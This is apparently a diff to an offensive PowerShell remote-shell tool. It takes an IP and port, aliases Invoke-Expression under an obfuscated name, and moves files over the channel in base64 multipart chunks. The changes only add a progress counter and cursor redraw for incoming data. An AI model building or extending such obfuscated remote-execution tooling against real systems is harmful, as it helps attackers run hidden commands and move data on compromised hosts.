@@ -47,6 +47,7 @@ $IP = $args[1]
 $Port = $args[2]
 $Start = "True"
 $Chunk = $args[4]
+$DataCount = 1
 $Alias1 = "Invoke" ; $Alias2 = "Express"
 Set-Alias sh -value "$Alias1-$Alias2`ion"
 if ($OSVersion -like "*Win*") { $localslash = "\" } else { $localslash = "/" } 
@@ -158,9 +159,12 @@ $data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $download = "Fals
 
 elseif ($Multi -eq "True") { if ($(R64Decoder -t $data) -eq "[+] MultiPart Data OK!") { 
 if ($MultiDown -eq "True") { $Multi = "False" ; $data = R64Decoder -f $multidata $downfile ; $MultiDown = "False"
-$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $multidata = $null ; Write-Host "`n" }
+$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $DataCount = 1 ; $multidata = $null ; Write-Host "`n" }
 else { $Multi = "False" ; $data = R64Decoder -t $multidata ; $multidata = $null ; Write-Host "`n" }}
-else { $multidata += $data ; $data = $null ; Write-Host "." -ForegroundColor Yellow -NoNewline }}
+else { $cursortop = [System.Console]::get_CursorTop() ; $multidata += $data ; $data = $null
+Write-Host "." -ForegroundColor Yellow -NoNewline ; $DataCount++ ; if ($DataCount -eq 11){ $DataCount = 1
+[Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "                                          " -ForegroundColor Yellow -NoNewline
+[Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "[+] Receiving MultiPart Data.." -ForegroundColor Yellow -NoNewline }}}
 
 else { if ($data -ne $null) { $data = R64Decoder -t $data }}
 
@@ -168,7 +172,7 @@ if (!$data) { if ($Multi -eq "False") { Write-Host }}
 if ($data -eq "[+] Ready to upload!") { $data = $null }
 if ($data -eq "[+] File uploaded!") { $data = "[+] File uploaded on $path$remoteslash$upfile!`n" }
 if ($data -eq "[+] Sending MultiPart Data..") { $data = $null ; $Multi = "True"
-Write-Host "[+] Receiving MultiPart Data" -ForegroundColor Yellow -NoNewline }
+Write-Host "[+] Receiving MultiPart Data.." -ForegroundColor Yellow -NoNewline }
 
 if ($data -like '*[+]*') { Write-Host $data -ForegroundColor Green }
 else { if ($data) { Write-Host $data -ForegroundColor Yellow }}
